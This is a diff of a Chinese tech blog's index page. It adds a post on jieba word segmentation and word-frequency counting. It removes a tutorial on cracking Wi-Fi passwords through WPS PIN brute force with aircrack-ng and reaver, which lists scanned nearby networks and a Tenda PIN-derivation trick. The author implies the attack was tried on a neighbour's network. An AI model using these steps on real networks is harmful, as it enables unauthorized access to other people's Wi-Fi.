@@ -9,7 +9,7 @@
   <meta name="author" content="ourren">
 
   
-  <meta name="description" content="前几天跟一个创业的年轻人聊天，无意中谈到了他正在做的创业项目，其它他当时也只是描述一种模式：生活在中我们经常在小卖部或者店铺直接购买商品，这种购买方式不同于网络购物（后者可以在支付宝或者京东或者腾讯上积分，然后用积分换取RMB），他们想做的就是让用户在现金购物的时候进行积分，从而实现线下积分。 &hellip;">
+  <meta name="description" content="话说近两年大数据确实火了，带给我们最直接的视觉感受就是利用图或者表来展示大数据所隐藏的内容，真是真实而又直观。然而技术博客的侧边栏标签云就是一种原始雏形，只不过这种标签是通过作者手动添加而生成的。本文就是想通过自动提取博文标题中的关键字，然后通过插件来进行显示。核心技术就是：中文分词与词频统计 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -67,6 +67,125 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/2014/09/24/chinese_token_and_frequency/">中文分词与词频统计实例</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-09-24T00:00:00-07:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>12:00 am</span></time>
+        
+        
+            | <a href="/2014/09/24/chinese_token_and_frequency/#comments">留言</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><img class="aligncenter" src="http://blog.ourren.com/blog/jieba_tu.png" alt="" width="532" height="463"></p>
+
+<p>话说近两年大数据确实火了，带给我们最直接的视觉感受就是利用图或者表来展示大数据所隐藏的内容，真是真实而又直观。然而技术博客的侧边栏标签云就是一种原始雏形，只不过这种标签是通过作者手动添加而生成的。本文就是想通过自动提取博文标题中的关键字，然后通过插件来进行显示。核心技术就是：中文分词与词频统计。</p>
+
+<p><strong>关于中文分词</strong></p>
+
+<p>中文跟英语在分词技术上差别比较多，中文多个字往往可以组成多个词语，而且词语之还可以缩写。例如：苏州杭州　可以缩写为　苏杭；而英文则相对固定，一个单词就是一个单词。也难怪平时在word中的词语错误提醒功能不能完全纠正中文书写错误，而可以纠正所有的英文书写错误。</p>
+
+<p>目前国内针对中文分词有几个比较流行的库：</p>
+
+<ul>
+    <li>jieba：基于python语言开发，同时最开始接触的也是这个开源库，整体而言也不错，github上关注度也是最高的；</li>
+    <li>Yaha：也是基于python语言开发的，跟jieba差不多，貌似功能方面有所改变；</li>
+    <li>NLPIR：开发语言C/C++/C#/Java；</li>
+    <li>其它分词可以参见参考链接1；</li>
+</ul>
+
+
+<p>可以说这些分词库各有差别，选择一款适合自己的库就行了，本次选择的是jieba，主要是由于基于python开发，并且在国内分词中流行度比较高（V2EX原来的主题tag就是基于jieba做的）。</p>
+
+<p><strong>提取所有标题</strong></p>
+
+<p>将数据库中的wp-post表中的数据导出csv格式，然后用excel打开并提取title列存为txt格式，这样子所有的标题都存在txt文件里面了。</p>
+
+<p><strong>标题分词</strong></p>
+
+<p>采用jieba给的实例程序进行标题分词，实际上可以将所有的标题当做一段话进行分词，但是为了更佳准确，还是选择了单个标题进行分词，直接上代码，非常简短：</p>
+
+<blockquote>
+<em>#encoding=utf-8</em>
+<em>import jieba</em>
+<em>wordsall = {} #define return dic</em>
+<em>postfile = open(&#8216;title&#8217;,&#8217;r&#8217;)</em>
+<em>ptitle = postfile.readlines()</em>
+<em>for ititle in ptitle:</em>
+<em>　ititle = ititle.replace(&#8216;\n&#8217;,&#8221;) #clean \n</em>
+<em>　seg_list = jieba.cut(ititle, cut_all=False)</em>
+<em>　print &#8221; &#8220;.join(seg_list)</em>
+</blockquote>
+
+
+<p>这样子就可以直接吧所有的标题进行分词并打印出来。其实jieba在分词的时候有三种模式（可以参考链接２），而本次采用的就是全模式：</p>
+
+<ul>
+    <li>精确模式，试图将句子最精确地切开，适合文本分析；</li>
+    <li>全模式，把句子中所有的可以成词的词语都扫描出来, 速度非常快，但是不能解决歧义；</li>
+    <li>搜索引擎模式，在精确模式的基础上，对长词再次切分，提高召回率，适合用于搜索引擎分词。</li>
+</ul>
+
+
+<p>其实代码还可以写得更好点，统计关键字并统计每个词语出现的次数，代码如下：</p>
+
+<blockquote>#encoding=utf-8
+import jieba
+wordsall = {} #define return dic
+postfile = open(&#8216;title&#8217;,&#8217;r&#8217;)
+ptitle = postfile.readlines()
+for ititle in ptitle:
+ititle = ititle.replace(&#8216;\n&#8217;,&#8221;) #clean \n
+seg_list = jieba.cut(ititle, cut_all=False)
+rowlist = &#8221; &#8220;.join(seg_list)
+words = rowlist.split(&#8217; &#8216;)
+for word in words:
+if word !=&#8221;:
+if word in wordsall:
+wordsall[word]+=1
+else:
+wordsall[word] = 1
+wordsall = sorted(wordsall.items(), key=lambda d:d[1], reverse = True)
+for (word, cnt) in wordsall:
+print &#8220;%s:&#8221; % word,cnt</blockquote>
+
+
+<p><strong>文字图显示</strong></p>
+
+<p>其实在上面的过程中虽然对标题的词语进行了分词，但是一般的人还是看不太懂这个博客主要写了什么内容，而目前很流行的文字图则更加方便地普通人快速了解相关信息。这类主要采用在线服务实现文字图的绘画，在线平台只需要提供关键字即可显示文字图，本次采用了<a href="http://worditout.com/word-cloud/make-a-new-one" target="_blank">worditout</a>的在线服务进行生成；</p>
+
+<p>将上面生成的词语复制到worditout的文本框中，就生成了文章最前面的图形，对比下发现这个文字图的效果和说服力跟我手动标注的标签云差不多，也即是说自动的标签分割技术基本上已经成熟，不需要人工手动添加标签了。</p>
+
+<p>其实，还有很多其它的在线文字图生成系统，可以参照这里的<a href="http://picsays.com/2012/07/09/word-cloud/" target="_blank">一篇文章</a>;</p>
+
+<p><strong>相关链接</strong></p>
+
+<ol>
+    <li><a href="http://www.zhihu.com/question/19578687" target="_blank">有哪些比较好的中文分词方案</a></li>
+    <li><a href="https://github.com/fxsjy/jieba" target="_blank">jieba</a></li>
+</ol>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -201,7 +320,7 @@
 </ol>
 
 
-<p>如何任何问题欢迎留言或者<span style="color: #000000;">微博： <a style="color: #cccccc;" href="http://t.qq.com/secwiki" target="_blank"><span style="color: #000000;">@腾讯微博</span></a> <a style="color: #cccccc;" href="http://weibo.com/secwiki" target="_blank"><span style="color: #000000;">@新浪微博</span></a></span><br style="color: #a4a1a1;"><span style="color: #000000;">意见反馈QQ群：295202941</span><br style="color: #a4a1a1;"><span style="color: #000000;">联系邮件：<a href="&#x6d;&#97;&#105;&#108;&#116;&#111;&#x3a;&#83;&#x65;&#99;&#x57;&#x69;&#x6b;&#x69;&#x40;&#x71;&#113;&#46;&#99;&#x6f;&#109;">&#83;&#x65;&#x63;&#87;&#105;&#107;&#105;&#64;&#113;&#113;&#x2e;&#99;&#x6f;&#x6d;</a></span></p>
+<p>如何任何问题欢迎留言或者<span style="color: #000000;">微博： <a style="color: #cccccc;" href="http://t.qq.com/secwiki" target="_blank"><span style="color: #000000;">@腾讯微博</span></a> <a style="color: #cccccc;" href="http://weibo.com/secwiki" target="_blank"><span style="color: #000000;">@新浪微博</span></a></span><br style="color: #a4a1a1;"><span style="color: #000000;">意见反馈QQ群：295202941</span><br style="color: #a4a1a1;"><span style="color: #000000;">联系邮件：<a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#58;&#x53;&#x65;&#x63;&#x57;&#x69;&#x6b;&#x69;&#x40;&#113;&#x71;&#46;&#99;&#111;&#x6d;">&#83;&#101;&#99;&#87;&#105;&#107;&#x69;&#x40;&#113;&#x71;&#x2e;&#x63;&#x6f;&#109;</a></span></p>
 </div>
   
   
@@ -481,121 +600,6 @@ $retarr = XXX::model()->findAll($criteria);
 <p>yiistrap是最新的开源项目，跟前面两个开源库的使用有所不同，扩充性和易用性更好。</p>
 
 <p>这几个开源库的配置相对比较简单，对应的网站都有相应的入门教程。</p>
-</div>
-  
-  
-
-
-    </article>
-  
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/2013/11/07/wireless_security_wps/">无线安全之WPS</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2013-11-07T00:00:00-08:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2013</span></span> <span class='time'>12:00 am</span></time>
-        
-        
-            | <a href="/2013/11/07/wireless_security_wps/#comments">留言</a>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p><img class="aligncenter" alt="wireless_attch_wps" src="http://blog.ourren.com/blog/wireless_attach.jpg" width="500" height="302"></p>
-
-<p>最近在淘宝入手了一套8187芯片主板与14DB平板天线，用我的老爷笔记本做了下测试，结果测试效果还行，邻居的电信带宽速度也不错。</p>
-
-<p>具体涉及的无线安全技术：主要是扫描开放有WPS功能的无线路由器，然后通过开源软件reaver来暴力破解pin码，最后通过pin来得到无线路由器WPA-PSK密码。前面暴力破解时间稍微比较长，后面这个过程可以说是秒杀。</p>
-
-<h3>配置</h3>
-
-
-<p>基本配置就如下所示，出了笔记本电脑外其它就价格也就RMB120块左右。</p>
-
-<p><em>8187 芯片主板</em>
-<em>14DB平板天线</em>
-<em>3米 USB2.0延长线</em>
-<em>安装Linux 系统的笔记本</em></p>
-
-<p>话说14DB的平板天线看起来还是很霸气的，关于事事如意18DB天线也测试了下效果差不多，不知道是不是楼层的问题。</p>
-
-<h3>准备工作</h3>
-
-
-<p>安装驱动和工具(aircrack-ng和reaver)，Ubuntu可以直接APT，其它系统可以需要下载源码安装，不过都很简单。</p>
-
-<p><em>sudo apt-get install aircrack-ng </em>
-<em>sudo apt-get install reaver</em></p>
-
-<h3>破解过程</h3>
-
-
-<p>1、开启网卡的监控模式</p>
-
-<p>sudo airmon-ng start wlan0</p>
-
-<p>2、扫描附近的无线信号</p>
-
-<p>sudo airodump-ng mon0</p>
-
-<p>在这个过程中你会看到很多无线信号，主要观察几个参数 ：PWR(信号强度，越小越好)，MB(需要为54e.)。</p>
-
-<p>BSSID      PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID
-68:53:21:E3:30:BE  -1 0 0 0 143 -1 &lt;length: 0>
-BC:D1:77:25:76:84 -47 50 2 0 1 54e WPA2 CCMP PSK fire
-C8:3A:35:55:42:E8 -44 35 0 0 8 54e WPA CCMP PSK Tenda_5542E8
-1C:FA:68:1C:7D:D6 -56 30 0 0 6 54e. WPA2 CCMP PSK hool
-A8:15:4D:83:6A:24 -51 29 5 0 11 54e. WPA2 CCMP PSK show
-F4:EC:38:3D:02:B6 -53 19 0 0 1 54e. WPA2 CCMP PSK</p>
-
-<p>这里特别强调下Tenda路由器可以秒杀，其路由器的MAC前面地址为： C8:3A:35，后面6为是pin的前8位的十六进制。因此只需要复制MAC地址的后6位，然后转为十进制，就可以得到PIN码的前面的数字了。</p>
-
-<p>3、破解PIN码</p>
-
-<p>sudo reaver -i mon0 -b MAC -a -S -vv -d 0 -c 1</p>
-
-<p>知道PIN前面的数字的时候可以用下面这个命令：</p>
-
-<p>sudo reaver -i mon0 -b MAC -a -S -vv -d 0 -c 6 -p 40000</p>
-
-<p>-b 后面跟MAC地址</p>
-
-<p>-c 频道，从扫描结果看</p>
-
-<p>然后就开始破解了，等4个小时左右基本上可以搞定。</p>
-
-<p>附上reaver调整参数的一些小技巧</p>
-
-<p>reaver:</p>
-
-<p>-i 监听后接口名称</p>
-
-<p>-b 目标mac地址</p>
-
-<p>-a 自动检测目标AP最佳配置</p>
-
-<p>-S 使用最小的DH key（可以提高PJ速度）</p>
-
-<p>-vv 显示更多的非严重警告</p>
-
-<p>-d 即delay每穷举一次的闲置时间 预设为1秒</p>
-
-<p>-t 即timeout每次穷举等待反馈的最长时间</p>
-
-<p>-c 指定频道可以方便找到信号</p>
-
-<p> </p>
 </div>
   
   
